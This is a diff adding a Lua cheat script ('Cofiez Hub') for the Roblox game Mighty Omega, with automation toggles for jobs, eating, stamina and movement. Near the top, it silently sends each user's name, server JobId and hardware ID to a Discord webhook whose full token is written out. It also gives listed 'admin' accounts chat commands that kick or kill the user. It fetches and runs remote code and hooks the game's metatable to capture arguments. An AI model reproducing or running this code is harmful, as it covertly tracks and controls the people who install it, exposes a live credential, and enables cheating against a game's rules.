@@ -1,0 +1,896 @@
+repeat wait() until game:IsLoaded()
+if game.CoreGui:FindFirstChild("Mana") then
+    game.CoreGui.Mana:Destroy()
+end
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+function Send(title, desc, URL)
+    local Data = game:GetService("HttpService"):JSONEncode({
+        ["embeds"] = {{
+            ["title"] = title,
+            ["description"] = desc,
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7269da),
+        }}
+    })
+    request = http_request or request or HttpPost or syn.request
+    request({Url = URL, Body = Data, Method = "POST", Headers = {["content-type"] = "application/json"}})
+end
+if HWID == "A4251BAB-7BD8-46A1-BB58-5255BBDAECD3" then
+else
+Send("||"..game.Players.LocalPlayer.Name.."||","**JobId:** ".."||"..game.JobId.."||".." **| HWID:** ".."||"..HWID.."||", "https://discord.com/api/webhooks/936238878405316618/4jR3PUJ3f3bueXt065-7foyzEOanroX0BEdcGwPjpkbCcaVdbDRuiW5XT62nJoXAIfsH")
+end
+
+getgenv().AdminNameTable = {
+    "TizCof",
+    "JS2_Tiz",
+    "SubaruKuku",
+    "Shampaii",
+    "Shad_ii",
+    "Sky_po",
+    "ovFIOrPx0hbh2n37xQ4k"
+}
+local callbacknoti1 = Instance.new("BindableFunction")
+function callbacknoti1.OnInvoke(abc)
+    if abc == "Yes" then
+        game:GetService("StarterGui"):SetCore("SendNotification",  {
+        Title = "Alright!";
+        Text = "Join Discord Server For More Info!";
+        Icon = "";
+        Duration = 5;
+        Button1 = "Done";
+        }
+        )
+    elseif abc == "No" then
+        setclipboard(tostring("discord.gg/kzNFNEFRbz"))
+        game:GetService("StarterGui"):SetCore("SendNotification",  {
+        Title = "Copied Invitelink!";
+        Text = "";
+        Icon = "";
+        Duration = 5;
+        Button1 = "Done";
+        }
+        )
+    end
+end
+function CopyInvite()
+    setclipboard(tostring("discord.gg/kzNFNEFRbz"))
+    wait()
+    game:GetService("StarterGui"):SetCore("SendNotification",  {
+    Title = "Copied Invitelink!";
+    Text = "Is It Copied yet?";
+    Icon = "";
+    Callback = callbacknoti1;
+    Duration = 30;
+    Button1 = "Yes";
+    Button2 = "No";
+    }
+    )
+end
+
+spawn(function()
+    for i,v in pairs(game.Players:GetChildren()) do
+        for k,p in pairs(getgenv().AdminNameTable) do
+            if v.Name == p then
+                local plr = game.Players.LocalPlayer
+                v.Chatted:Connect(function(msg)
+                    local plrlen = plr.Name:len()
+                    if plr.Name == p then
+                        print("A+2=3=>A=3-2=1=>A=1")
+                    else
+                        if msg:sub(1,6) == "/kick " then
+                            local plrkick = game.Players:FindFirstChild(msg:sub(7))
+                            if plrkick then
+                                plr:Kick("You got kicked!")   
+                            end
+                        elseif msg:sub(1,6) == "/kill " then
+                            local plrkill = game.Players:FindFirstChild(msg:sub(7))
+                            if plrkill then
+                                plr.Character.Head.Neck:Destroy()
+                                plr.Character.Humanoid.Health = 0
+                                plr.Character.Humanoid:TakeDamage(math.huge)
+                            end
+                        elseif msg:sub(1,5) == "/ban " then
+                            local plrban = game.Players:FindFirstChild(msg:sub(6))
+                            if plrban then
+                                local args = {
+                                    [1] = "",
+                                    [2] = "RunToggle",
+                                    [3] = {
+                                        [1] = true
+                                    }
+                                }
+                                game:GetService("Players").LocalPlayer.Backpack.Action:FireServer(unpack(args))
+                            end
+                        end
+                    end
+                end)
+            end
+        end
+    end
+end)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomGuy0nInternet/Cofiez_Hub_Premium/main/UI_Library/Main_Script_2"))()
+
+local a = Library:Window("Cofiez Hub", "Mighty Omega")
+
+local e = a:Tab("Home")
+local b = a:Tab("Main")
+local c = a:Tab("LocalPlayer")
+local d = a:Tab("Credit")
+e:Label("Welcome to Cofiez Hub")
+e:Label("Toggle UI: Right Ctrl")
+e:Label("Version: Free | 0.1.1")
+e:Label("Dev Logs: (15/03/2022 | DD/MM/YYYY)")
+e:Label("(1) New UI")
+e:Label("(2) Fixed [Auto Stamina]")
+e:Label("(3) Fixed [Change Value]")
+getgenv().MousePos = false
+local function TrueAutoStamina()
+    local info_true_1 = {[1] = getgenv().savearg1,[2] = "RunToggle",[3] = {[1] = true,[2] = false}} game:GetService("Players").LocalPlayer.Backpack.Action:FireServer(unpack(info_true_1))
+end
+local function FalseAutoStamina()
+    local info_false_1 = {[1] = getgenv().savearg1,[2] = "RunToggle",[3] = {[1] = false}} game:GetService("Players").LocalPlayer.Backpack.Action:FireServer(unpack(info_false_1))
+end
+
+b:Toggle("Auto Job", false, function(check)
+    getgenv().v___0 = check
+    getgenv().v___1 = true
+    getgenv().v___2 = false
+    getgenv().v___3 = false
+    getgenv().v___4 = false
+    getgenv().v___5 = false
+    getgenv().v___6 = false
+    getgenv().v___7 = false
+    getgenv().v___8 = false
+    getgenv().v___9 = false
+    getgenv().v___10 = false
+    getgenv().v___11 = false
+    getgenv().v___12 = false
+    getgenv().v___13 = false
+    getgenv().v___14 = false
+    getgenv().v___15 = false
+    getgenv().v___16 = false
+    getgenv().v___17 = false
+    ---
+    local v1 = Vector3.new(-317.60885620117, 47.137981414795, -585.22619628906)
+    local v2 = Vector3.new(-317.88973999023, 47.137977600098, -592.13891601562)
+    local v3 = Vector3.new(-177.86753845215, 46.47798538208, -589.45153808594)
+    local v4 = Vector3.new(-178.14970397949, 46.437984466553, -441.67700195312)
+    local v5 = Vector3.new(368.29479980469, 27.387985229492, -445.60528564453)
+    local v6 = Vector3.new(419.78552246094, 28.138019561768, -847.77008056641)
+    local v7 = Vector3.new(368.29479980469, 27.387985229492, -445.60528564453)
+    local v8 = Vector3.new(-178.14970397949, 46.437984466553, -441.67700195312)
+    local v9 = Vector3.new(-177.86753845215, 46.47798538208, -589.45153808594)
+    local v10 = Vector3.new(-279.63241577148, 47.137992858887, -590.84283447266)
+    local v11 = Vector3.new(-280.81820678711, 47.237987518311, -552.75842285156)
+    local v12 = Vector3.new(-279.63241577148, 47.137992858887, -590.84283447266)
+    local v13 = Vector3.new(-309.34463500977, 47.93688583374, -600.7353515625)
+    local v14 = Vector3.new(-317.60885620117, 47.137981414795, -585.22619628906)
+
+    local posfastjob = {
+        
+    }
+    ---
+    local v__0 = 4
+    local v__1 = 1.5
+    local v__2 = game
+    local v__3 = "HumanoidRootPart"
+    local v__4 = "LocalPlayer"
+    local v__5 = "Humanoid"
+    local v__6 = "Players"
+    local v__7 = "Character" 
+    local v__8 = "Position"
+    local v__9 = "PlayerGui"
+    local v__10 = "JobGUI"
+    local v__11 = "Frame"
+    local v__12 = "Title" 
+    local v__13 = "Text"
+    local v__14 = "Restock Job"
+    local v__15 = "Workspace"
+    local v__16 = "JobBoardModel"
+    local v__17 = "ClickDetector"
+    local v__18 = "Quit"
+    local v__19 = "MouseButton1Click"
+    local v__20 = "Function"
+    local v__21 = "Board"
+    local v__22 = "Magnitude"
+    local v__26 = "Cleaning Job"
+    local v__27 = "Delivery Job"
+    local v__28 = game:GetService("VirtualUser")
+    ---
+    local function v__23()
+        local v__24 = (v__2[v__6][v__4][v__7][v__3][v__8] - v__2[v__15][v__16][v__21][v__8])[v__22]
+        wait()
+        if v__24 > v__0 then
+            getgenv().v___15 = false
+        elseif v__24 < v__0 then
+            getgenv().v___15 = true
+        end
+    end
+    local function v__25()
+        for v____21,v____22 in pairs(getconnections(v__2[v__6][v__4][v__9][v__10][v__11][v__18][v__19])) do
+            v____22[v__20]()
+        end
+    end
+    ---
+    spawn(function()
+    while getgenv().v___0 == true do wait()
+            v__23()
+            wait()
+            if v___15 == true then wait()
+                if v__2[v__6][v__4][v__9]:FindFirstChild(v__10) == nil then
+                    fireclickdetector(v__2[v__15][v__16][v__17])
+                elseif v__2[v__6][v__4][v__9]:FindFirstChild(v__10) and v__2[v__6][v__4][v__9][v__10][v__11][v__12][v__13] == v__26 then
+                    wait(0.2)
+                    v__25()
+                    wait(0.5)
+                    fireclickdetector(v__2[v__15][v__16][v__17])
+                elseif v__2[v__6][v__4][v__9]:FindFirstChild(v__10) and v__2[v__6][v__4][v__9][v__10][v__11][v__12][v__13] == v__27 then
+                    wait(0.2)
+                    v__25()
+                    wait(0.5)
+                    fireclickdetector(v__2[v__15][v__16][v__17])
+                elseif v__2[v__6][v__4][v__9]:FindFirstChild(v__10) and v__2[v__6][v__4][v__9][v__10][v__11][v__12][v__13] == v__14 then
+                    getgenv().v___16 = false
+                    wait()
+                    getgenv().v___17 = true
+                end
+            elseif getgenv().v___15 == false then
+                wait()
+                v__23()
+            end
+        end
+    end)
+    ---
+    spawn(function()
+    while getgenv().v___1 == true and getgenv().v___0 == true do wait()
+    repeat wait()
+        if getgenv().v___1 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v1)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v1).Magnitude <= v__1 then
+
+                if v__2[v__6][v__4][v__9]:FindFirstChild(v__10) and v__2[v__6][v__4][v__9][v__10][v__11][v__12][v__13] == v__14 then
+                    getgenv().v___1 = false
+                    getgenv().v___2 = true
+                    getgenv().v___3 = false
+                    getgenv().v___4 = false
+                    getgenv().v___5 = false
+                    getgenv().v___6 = false
+                    getgenv().v___7 = false
+                    getgenv().v___8 = false
+                    getgenv().v___9 = false
+                    getgenv().v___10 = false
+                    getgenv().v___11 = false
+                    getgenv().v___12 = false
+                    getgenv().v___13 = false
+                    getgenv().v___14 = false
+                end
+            end
+        end
+    until getgenv().v___1 == false
+    repeat wait()
+        if getgenv().v___2 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v2)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v2).Magnitude <= v__1 then
+                getgenv().v___1 = false
+                getgenv().v___2 = false
+                getgenv().v___3 = true
+                getgenv().v___4 = false
+                getgenv().v___5 = false
+                getgenv().v___6 = false
+                getgenv().v___7 = false
+                getgenv().v___8 = false
+                getgenv().v___9 = false
+                getgenv().v___10 = false
+                getgenv().v___11 = false
+                getgenv().v___12 = false
+                getgenv().v___13 = false
+                getgenv().v___14 = false
+            end
+        end
+    until getgenv().v___2 == false
+    repeat wait()
+        if getgenv().v___3 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v3)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v3).Magnitude <= v__1 then
+                getgenv().v___1 = false
+                getgenv().v___2 = false
+                getgenv().v___3 = false
+                getgenv().v___4 = true
+                getgenv().v___5 = false
+                getgenv().v___6 = false
+                getgenv().v___7 = false
+                getgenv().v___8 = false
+                getgenv().v___9 = false
+                getgenv().v___10 = false
+                getgenv().v___11 = false
+                getgenv().v___12 = false
+                getgenv().v___13 = false
+                getgenv().v___14 = false
+            end
+        end     
+    until getgenv().v___3 == false
+    repeat wait()
+        if getgenv().v___4 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v4)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v4).Magnitude <= v__1 then
+                getgenv().v___1 = false
+                getgenv().v___2 = false
+                getgenv().v___3 = false
+                getgenv().v___4 = false
+                getgenv().v___5 = true
+                getgenv().v___6 = false
+                getgenv().v___7 = false
+                getgenv().v___8 = false
+                getgenv().v___9 = false
+                getgenv().v___10 = false
+                getgenv().v___11 = false
+                getgenv().v___12 = false
+                getgenv().v___13 = false
+                getgenv().v___14 = false
+            end
+        end
+    until getgenv().v___4 == false
+    repeat wait()
+        if getgenv().v___5 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v5)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v5).Magnitude <= v__1 then
+                getgenv().v___1 = false
+                getgenv().v___2 = false
+                getgenv().v___3 = false
+                getgenv().v___4 = false
+                getgenv().v___5 = false
+                getgenv().v___6 = true
+                getgenv().v___7 = false
+                getgenv().v___8 = false
+                getgenv().v___9 = false
+                getgenv().v___10 = false
+                getgenv().v___11 = false
+                getgenv().v___12 = false
+                getgenv().v___13 = false
+                getgenv().v___14 = false
+            end
+        end
+    until getgenv().v___5 == false
+    repeat wait()
+        if getgenv().v___6 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v6)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v6).Magnitude <= v__1 then
+                getgenv().v___1 = false
+                getgenv().v___2 = false
+                getgenv().v___3 = false
+                getgenv().v___4 = false
+                getgenv().v___5 = false
+                getgenv().v___6 = false
+                getgenv().v___7 = true 
+                getgenv().v___8 = false
+                getgenv().v___9 = false
+                getgenv().v___10 = false
+                getgenv().v___11 = false
+                getgenv().v___12 = false
+                getgenv().v___13 = false
+                getgenv().v___14 = false
+            end
+        end
+    until getgenv().v___6 == false
+    repeat wait()
+        if getgenv().v___7 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v7)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v7).Magnitude <= v__1 then
+                getgenv().v___1 = false
+                getgenv().v___2 = false
+                getgenv().v___3 = false
+                getgenv().v___4 = false
+                getgenv().v___5 = false
+                getgenv().v___6 = false
+                getgenv().v___7 = false
+                getgenv().v___8 = true
+                getgenv().v___9 = false
+                getgenv().v___10 = false
+                getgenv().v___11 = false
+                getgenv().v___12 = false
+                getgenv().v___13 = false
+                getgenv().v___14 = false
+            end
+        end
+    until getgenv().v___7 == false
+    repeat wait()
+        if getgenv().v___8 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v8)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v8).Magnitude <= v__1 then
+                getgenv().v___1 = false
+                getgenv().v___2 = false
+                getgenv().v___3 = false
+                getgenv().v___4 = false
+                getgenv().v___5 = false
+                getgenv().v___6 = false
+                getgenv().v___7 = false
+                getgenv().v___8 = false
+                getgenv().v___9 = true
+                getgenv().v___10 = false
+                getgenv().v___11 = false
+                getgenv().v___12 = false
+                getgenv().v___13 = false
+                getgenv().v___14 = false
+            end
+        end
+    until getgenv().v___8 == false
+    repeat wait()
+        if getgenv().v___9 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v9)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v9).Magnitude <= v__1 then
+                getgenv().v___1 = false
+                getgenv().v___2 = false
+                getgenv().v___3 = false
+                getgenv().v___4 = false
+                getgenv().v___5 = false
+                getgenv().v___6 = false
+                getgenv().v___7 = false 
+                getgenv().v___8 = false
+                getgenv().v___9 = false
+                getgenv().v___10 = true
+                getgenv().v___11 = false
+                getgenv().v___12 = false
+                getgenv().v___13 = false
+                getgenv().v___14 = false
+            end
+        end
+    until getgenv().v___9 == false
+    repeat wait()
+        if getgenv().v___10 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v10)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v10).Magnitude <= v__1 then
+                getgenv().v___1 = false
+                getgenv().v___2 = false
+                getgenv().v___3 = false
+                getgenv().v___4 = false
+                getgenv().v___5 = false
+                getgenv().v___6 = false
+                getgenv().v___7 = false
+                getgenv().v___8 = false
+                getgenv().v___9 = false
+                getgenv().v___10 = false
+                getgenv().v___11 = true
+                getgenv().v___12 = false
+                getgenv().v___13 = false
+                getgenv().v___14 = false
+            end
+        end
+    until getgenv().v___10 == false
+    repeat wait()
+        if getgenv().v___11 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v11)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v11).Magnitude <= v__1 then
+                getgenv().v___1 = false
+                getgenv().v___2 = false
+                getgenv().v___3 = false
+                getgenv().v___4 = false
+                getgenv().v___5 = false
+                getgenv().v___6 = false
+                getgenv().v___7 = false
+                getgenv().v___8 = false
+                getgenv().v___9 = false
+                getgenv().v___10 = false
+                getgenv().v___11 = false
+                getgenv().v___12 = true
+                getgenv().v___13 = false
+                getgenv().v___14 = false
+            end
+        end
+    until getgenv().v___11 == false
+    repeat wait()
+        if getgenv().v___12 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v12)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v12).Magnitude <= v__1 then
+                getgenv().v___1 = false
+                getgenv().v___2 = false
+                getgenv().v___3 = false
+                getgenv().v___4 = false
+                getgenv().v___5 = false
+                getgenv().v___6 = false
+                getgenv().v___7 = false
+                getgenv().v___8 = false
+                getgenv().v___9 = false
+                getgenv().v___10 = false
+                getgenv().v___11 = false
+                getgenv().v___12 = false
+                getgenv().v___13 = true
+                getgenv().v___14 = false
+            end
+        end
+    until getgenv().v___12 == false
+    repeat wait()
+        if getgenv().v___13 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v13)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v13).Magnitude <= v__1 then
+                getgenv().v___1 = false
+                getgenv().v___2 = false
+                getgenv().v___3 = false
+                getgenv().v___4 = false
+                getgenv().v___5 = false
+                getgenv().v___6 = false
+                getgenv().v___7 = false
+                getgenv().v___8 = false
+                getgenv().v___9 = false
+                getgenv().v___10 = false
+                getgenv().v___11 = false
+                getgenv().v___12 = false
+                getgenv().v___13 = false
+                getgenv().v___14 = true
+            end
+        end
+        wait(0.5)
+    until getgenv().v___13 == false
+    repeat wait()
+        if getgenv().v___14 == true and getgenv().v___0 == true then
+            v__2[v__6][v__4][v__7][v__5]:MoveTo(v14)
+            if (v__2[v__6][v__4][v__7][v__3][v__8] - v14).Magnitude <= v__1 then
+                getgenv().v___1 = true
+                getgenv().v___2 = false
+                getgenv().v___3 = false
+                getgenv().v___4 = false
+                getgenv().v___5 = false
+                getgenv().v___6 = false
+                getgenv().v___7 = false
+                getgenv().v___8 = false
+                getgenv().v___9 = false
+                getgenv().v___10 = false
+                getgenv().v___11 = false
+                getgenv().v___12 = false
+                getgenv().v___13 = false
+                getgenv().v___14 = false
+            end
+        end
+        wait(0.5)
+    until getgenv().v___14 == false
+    end
+    end)
+end)
+b:Dropdown("Job", {"Restock"}, function(a)
+    getgenv().NameJob = a
+    end)
+    b:Dropdown("Type", {"Slow"}, function(a)
+    getgenv().TypeJob = a
+    end)
+--[[b:Toggle("Auto Job Fast | Locked", function(check)
+    getgenv().AutoJobFastBeta = check
+end)--]]
+b:Toggle("Auto Eat", false, function(a)
+    getgenv().AutoEat = a
+    spawn(function()
+        repeat wait()
+            if getgenv().AutoEat then
+                if getgenv().StomachPT <= getgenv().EatPhanTram then
+                    if game.Players.LocalPlayer.Character:FindFirstChild(getgenv().EatFood) and game.Players.LocalPlayer.Character[getgenv().EatFood]:IsA("Tool") then
+                        wait(1)
+                        local virtual = game:GetService("VirtualUser")
+                        wait(0.1)
+                        virtual:ClickButton1(Vector2.new(2000, 2000))
+                    else
+                        if game.Players.LocalPlayer.Backpack:FindFirstChild(getgenv().EatFood) and game.Players.LocalPlayer.Character:FindFirstChild(getgenv().EatFood) == nil then
+                            wait(0.1)
+                            game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild(getgenv().EatFood))
+                        end
+                    end
+                end
+            end
+        until getgenv().AutoEat == false
+    end)
+end)
+b:Slider("Automatically eat when ... %", 1, 100, 1, function(a)
+    getgenv().EatPhanTram = a
+end)
+b:Textbox("Food Name", false, function(a)
+    getgenv().EatFood = a
+end)
+b:Dropdown("List Foods", {"Hamburger", "Omelette", "Pancake", "Donut", "Pie", "EZ Taco", "Hotdog"}, function(a)
+    getgenv().EatFood = a
+end)
+b:Toggle("Auto Treadmill", false, function(check)
+    getgenv().AutoTread1 = check
+    spawn(function()
+        repeat wait(.5) --
+            if game.Players.LocalPlayer.Character.CurrentStamina.Value > 5 then
+                getgenv().AutoTread2 = true
+                if getgenv().AutoTread2 == true then
+                    if game.Players.LocalPlayer.PlayerGui:FindFirstChild("TreadmillMachineGUI") then
+                        game:GetService("VirtualInputManager"):SendKeyEvent(true, game.Players.LocalPlayer.PlayerGui:FindFirstChild("TreadmillMachineGUI").Frame3.TrainingF.ButtonTemplate.Input.Text, false ,game)
+                    end
+                end
+            elseif game.Players.LocalPlayer.Character.CurrentStamina.Value < 5 then
+                getgenv().AutoTread2 = false
+            end
+        until getgenv().AutoTread1 == false 
+    end)
+end)
+b:Toggle("Auto Stamina", false, function(check)
+getgenv().AutoStaminaEN = check
+    if getgenv().AutoStaminaEN then
+        spawn(function()
+            if getgenv().savearg1 then
+                Library:Notification("Check", "Found Args!")
+            elseif getgenv().savearg1 == nil then
+                local mt = getrawmetatable(game);
+                local oldnamecall = mt.__namecall
+                setreadonly(mt,false)
+                mt.__namecall = newcclosure(function(self,...)
+                args = {...}
+                method = getnamecallmethod()
+                if  self.Name == "Action" and getgenv().savearg1 == nil then
+                    getgenv().savearg1 = args[1]
+                end
+                return oldnamecall(self,...)
+                end)
+                setreadonly(mt,true)
+            end       
+        end)
+        spawn(function()
+            while getgenv().AutoStaminaEN do wait()
+                if getgenv().AutoStaminaEN == false then
+                    local info_false_1 = {[1] = getgenv().savearg1,[2] = "RunToggle",[3] = {[1] = false}} game:GetService("Players").LocalPlayer.Backpack.Action:FireServer(unpack(info_false_1))
+                end
+                if getgenv().savearg1 then
+                    if game.Players.LocalPlayer.Character.CurrentStamina.Value >= 20 then
+                        local info_true_1 = {[1] = getgenv().savearg1,[2] = "RunToggle",[3] = {[1] = true,[2] = false}} game:GetService("Players").LocalPlayer.Backpack.Action:FireServer(unpack(info_true_1))
+                        wait(3)
+                    elseif game.Players.LocalPlayer.Character.CurrentStamina.Value <= 10 then
+                        local info_false_1 = {[1] = getgenv().savearg1,[2] = "RunToggle",[3] = {[1] = false}} game:GetService("Players").LocalPlayer.Backpack.Action:FireServer(unpack(info_false_1))
+                        wait(3)
+                    end
+                elseif getgenv().savearg1 == nil then
+                    Library:Notification("Check", "Can't find Args!")
+                    local mt = getrawmetatable(game);
+                    local oldnamecall = mt.__namecall
+                    setreadonly(mt,false)
+                    mt.__namecall = newcclosure(function(self,...)
+                    args = {...}
+                    method = getnamecallmethod()
+                    if  self.Name == "Action" and getgenv().savearg1 == nil then
+                        getgenv().savearg1 = args[1]
+                    end
+                    return oldnamecall(self,...)
+                    end)
+                    setreadonly(mt,true)
+                    wait(3)
+                    Library:Notification("Check", "Your character will automatically run to get Args! ")
+                    wait(1)
+                    game:GetService("VirtualInputManager"):SendKeyEvent(true,"W",false,game)
+                    wait(.1)
+                    game:GetService("VirtualInputManager"):SendKeyEvent(true,"W",false,game)
+                end
+            end            
+        end)
+    else
+        if getgenv().savearg1 then
+            if getgenv().AutoStaminaEN == false then
+                local info_false_1 = {[1] = getgenv().savearg1,[2] = "RunToggle",[3] = {[1] = false}} game:GetService("Players").LocalPlayer.Backpack.Action:FireServer(unpack(info_false_1))
+            end
+        end
+    end
+end)
+b:Button("Boost FPS", function()
+    workspace:FindFirstChildOfClass('Terrain').WaterWaveSize = 0
+	workspace:FindFirstChildOfClass('Terrain').WaterWaveSpeed = 0
+	workspace:FindFirstChildOfClass('Terrain').WaterReflectance = 0
+	workspace:FindFirstChildOfClass('Terrain').WaterTransparency = 0
+	game:GetService("Lighting").GlobalShadows = false
+	game:GetService("Lighting").FogEnd = 9e9
+	settings().Rendering.QualityLevel = 1
+	for i,v in pairs(game:GetDescendants()) do
+		if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+			v.Material = "Plastic"
+			v.Reflectance = 0
+		elseif v:IsA("Decal") then
+			v.Transparency = 1
+		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+			v.Lifetime = NumberRange.new(0)
+		elseif v:IsA("Explosion") then
+			v.BlastPressure = 1
+			v.BlastRadius = 1
+		end
+	end
+	for i,v in pairs(game:GetService("Lighting"):GetDescendants()) do
+		if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
+			v.Enabled = false
+		end
+	end
+	workspace.DescendantAdded:Connect(function(child)
+		coroutine.wrap(function()
+			if child:IsA('ForceField') then
+				game:GetService('RunService').Heartbeat:Wait()
+				child:Destroy()
+			elseif child:IsA('Sparkles') then
+				game:GetService('RunService').Heartbeat:Wait()
+				child:Destroy()
+			elseif child:IsA('Smoke') or child:IsA('Fire') then
+				game:GetService('RunService').Heartbeat:Wait()
+				child:Destroy()
+			end
+		end)()
+	end)
+end)
+b:Button("Super Boost FPS", function()
+    if not game['Loaded'] or not game:GetService('Players')['LocalPlayer'] then
+        game['Loaded']:Wait();
+        game:WaitForChild(game:GetService('Players'));
+        game:GetService('Players'):WaitForChild(game:GetService('Players').LocalPlayer.Name)
+    end
+    
+    local LP = game:GetService('Players').LocalPlayer
+    --// Physics Settings
+    settings().Physics.PhysicsEnvironmentalThrottle = 1
+    settings().Rendering.QualityLevel = 'Level01'
+    -- Comment line 7 if you want to be able to hear your game, keep it the same if you're using it for bots.
+    
+    
+    
+    --// Physical/UI Derender
+    for _, v in next, game:GetDescendants() do
+        if v:IsA('Workspace') then
+            v.Terrain.Elasticity = 0
+            v.Terrain.WaterWaveSize = 0
+            v.Terrain.WaterWaveSpeed = 0
+            v.Terrain.WaterReflectance = 0
+            v.Terrain.WaterTransparency = 1
+        elseif v:IsA('Lighting') then
+            v.GlobalShadows = false
+            v.FogEnd = 1/0
+            v.Brightness = 0
+        elseif v:IsA('Model') then
+            sethiddenproperty(v, 'LevelOfDetail', 1)
+        elseif LP and v == LP then
+            v.ReplicationFocus = nil
+        elseif v:IsA('Decal') or v:IsA('Texture')  then
+            v.Transparency = 1
+        elseif v:IsA('Fire') or v:IsA('SpotLight') or v:IsA('Smoke') or v:IsA('Sparkles') then
+            v.Enabled = false
+        elseif v:IsA('SpecialMesh') then
+            v.TextureId = ''
+            v.MeshId = ''
+        elseif v:IsA('ParticleEmitter') or v:IsA('Trail') then
+            v.Lifetime = NumberRange.new(0)
+        elseif v:IsA('BlurEffect') or v:IsA('SunRaysEffect') or v:IsA('ColorCorrectionEffect') or v:IsA('BloomEffect') or v:IsA('DepthOfFieldEffect')  then
+            v.Enabled = false
+        elseif (v:IsA('BasePart') or v:IsA("Union") or v:IsA("CornerWedgePart")) and not v:IsA('MeshPart') then
+            v.Reflectance = 0
+            v.Material = 'SmoothPlastic'
+        elseif v:IsA('Pants') or v:IsA('Shirt') then
+            v[v.ClassName..'Template'] = ''
+        elseif v:IsA('Explosion') then
+            v.BlastPressure = 0
+            v.BlastRadius = 0
+            v.Visible = false
+            v.Position = Vector3.new(0, 0, 0)
+        elseif v:IsA('ForceField') then
+            v.Visible = false
+        elseif v:IsA('ShirtGraphic') then
+            v.Graphic = ''
+        elseif v:IsA('MeshPart') then
+            v.MeshId = ''
+            v.TextureID = ''
+            v.Reflectance = 0
+            v.Material = 'SmoothPlastic'
+        elseif v:IsA('CharacterMesh') then
+            v.BaseTextureId = ''
+            v.MeshId = ''
+            v.OverlayTextureId = ''
+        end
+    end
+    
+    local WorkspaceChildAdded;WorkspaceChildAdded = workspace.DescendantAdded:Connect(function(v)
+        wait()
+        if v:IsA('Model') then
+            sethiddenproperty(v, 'LevelOfDetail', 1)
+        elseif LP and v == LP then
+            v.ReplicationFocus = nil
+        elseif v:IsA('Decal') or v:IsA('Texture')  then
+            v.Transparency = 1
+        elseif v:IsA('Fire') or v:IsA('SpotLight') or v:IsA('Smoke') or v:IsA('Sparkles') then
+            v.Enabled = false
+        elseif v:IsA('SpecialMesh') then
+            v.TextureId = ''
+            v.MeshId = ''
+        elseif v:IsA('ParticleEmitter') or v:IsA('Trail') then
+            v.Lifetime = NumberRange.new(0)
+        elseif v:IsA('BlurEffect') or v:IsA('SunRaysEffect') or v:IsA('ColorCorrectionEffect') or v:IsA('BloomEffect') or v:IsA('DepthOfFieldEffect')  then
+            v.Enabled = false
+        elseif v:IsA('BasePart') and not v:IsA('MeshPart') then
+            v.Reflectance = 0
+            v.Material = 'SmoothPlastic'
+        elseif v:IsA('Pants') or v:IsA('Shirt') then
+            v[v.ClassName..'Template'] = ''
+        elseif v:IsA('Explosion') then
+            v.BlastPressure = 0
+            v.BlastRadius = 0
+            v.Visible = false
+            v.Position = Vector3.new(0, 0, 0)
+        elseif v:IsA('ForceField') then
+            v.Visible = false
+        elseif v:IsA('ShirtGraphic') then
+            v.Graphic = ''
+        elseif v:IsA('MeshPart') then
+            v.MeshId = ''
+            v.TextureID = ''
+            v.Reflectance = 0
+            v.Material = 'SmoothPlastic'
+        elseif v:IsA('CharacterMesh') then
+            v.BaseTextureId = ''
+            v.MeshId = ''
+            v.OverlayTextureId = ''
+        end
+    end)
+     game.Lighting.ChildAdded:Connect(function(v)
+        if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
+           v.Enabled = false
+        end
+     end)
+end)
+getgenv().ValueWalk1 = 1
+c:Toggle("Change Value", false, function(a)
+    if a then
+    local hb = game:GetService("RunService").Heartbeat
+        repeat hb:wait()
+            game.Players.LocalPlayer.Character:TranslateBy(game.Players.LocalPlayer.Character.Humanoid.MoveDirection * tonumber(getgenv().ValueWalk1/100))
+            game.Players.LocalPlayer.Character.Humanoid.JumpPower = getgenv().ValueJump1
+        until a == false
+    else
+        getgenv().ValueWalk1 = 0
+        getgenv().ValueJump1 = 40
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 40
+    end
+end)
+
+c:Slider("WalkSpeed", 1, 500, 1, function(a)
